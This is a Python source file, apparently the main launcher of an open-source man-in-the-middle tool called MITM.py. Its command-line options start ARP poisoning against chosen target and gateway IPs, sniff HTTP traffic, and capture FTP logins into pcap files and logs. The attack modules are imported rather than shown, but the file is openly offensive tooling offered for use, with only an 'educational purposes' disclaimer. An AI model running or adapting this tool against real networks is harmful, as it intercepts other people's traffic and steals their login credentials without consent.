from include import arppoison, ftp_sniff, http_sniff
from colorama import init, Fore
import argparse,textwrap,time,logging

VERSION = "1.0.0"
AUTHOR  = "ReddyyZ"

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

def arguments():
    parser = argparse.ArgumentParser(prog="mitm.py",formatter_class=argparse.RawDescriptionHelpFormatter,
                                    description=textwrap.dedent(f"""
                                                    MITM.PY - v{VERSION}

                                        Tool for MITM attacks developed by ReddyyZ
                                        Developed with educational purposes!
                                        Github: https://github.com/ReddyyZ/MITM.py
                                    """))

    parser.add_argument("--arp",help="Enable ARP Poisoning attack",action="count")
    parser.add_argument("--http",help="Sniff HTTP packets",action="count")
    parser.add_argument("--ftp",help="Sniff FTP logins",action="count")
    parser.add_argument("-G","--gateway",help="Gateway IP for ARP Poisoning attacks",metavar="IP")
    parser.add_argument("-T","--targets",help="Targets IPs separated by /",metavar="IP")
    parser.add_argument("-v","--verbose",action="count")

    args = parser.parse_args()
    
    if not args.arp and not args.http and not args.ftp: exit(parser.print_help())
    return (args.arp,args.http,args.ftp,args.gateway,args.targets,args.verbose)

class MITM(object):
    def __init__(self):
        self.arp, self.http, self.ftp, self.gateway, self.targets, self.verbose = arguments()

        self.files = {}

        init()
        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
        logging.addLevelName(logging.DEBUG, f"[{cyan}**{reset}]")
        logging.basicConfig(format="%(levelname)s %(message)s", level=logging.DEBUG if self.verbose else logging.INFO)
        self._arp()
        self._http()
        self._ftp()

    def _arp(self):
        if self.arp:
            logging.info("Starting ARP Poisoning Attack")
            self.arp = arppoison.ARPPoison(self.targets,self.gateway,self.verbose)
            self.arp.start()

    def _http(self):
        if self.http:
            logging.info("Starting HTTP Sniff Attack")
            self.http = http_sniff.HttpSniff(verbose=self.verbose)
            self.http.start()

    def _ftp(self):
        if self.ftp:
            logging.info("Starting FTP Sniff Attack")
            self.ftp = ftp_sniff.FTPSniff(verbose=self.verbose)
            self.ftp.start()

    def stop(self):
        logging.info("Stopping attacks")
        if self.arp:
            self.arp.stop()
        if self.http:
            x, y = self.http.stop()
            self.files["HTTP"] = {
                "pcap": x,
                "logs": y,
            }
        if self.ftp:
            x, y = self.ftp.stop()
            self.files["FTP"] = {
                "pcap": x,
                "logs": y,
            }
        print("")
        logging.info("Log files:")
        for key in self.files.keys():
            print(f"    {key}:\n      PCAP: {self.files[key]['pcap']}\n      LOGS: {self.files[key]['logs']}")

if __name__ == "__main__":
    mitm = MITM()
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        mitm.stop()
        